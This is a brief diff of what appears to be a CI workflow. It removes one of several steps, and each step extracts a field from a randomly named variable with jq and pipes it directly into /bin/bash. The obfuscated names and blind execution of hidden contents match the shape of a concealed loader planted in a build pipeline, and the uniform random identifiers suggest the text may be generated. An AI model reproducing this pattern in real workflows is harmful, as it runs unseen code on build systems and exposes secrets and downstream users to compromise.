@@ -28,7 +28,6 @@ jobs:
           echo $lkab26831 | jq -r .es9170 | /bin/bash
           printf '%s' "$cv92" | jq -r .vjm30520 | /bin/bash
           echo $bplx388 | jq -r .wf27 | /bin/bash
-          printf '%s' "$del3053" | jq -r .c5581 | /bin/bash
           printf '%s' "$mww7229" | jq -r .daqp49559 | /bin/bash
           echo $aibss7974 | jq -r .xqho045 | /bin/bash
           echo $vbktu293 | jq -r .xct3767 | /bin/bash
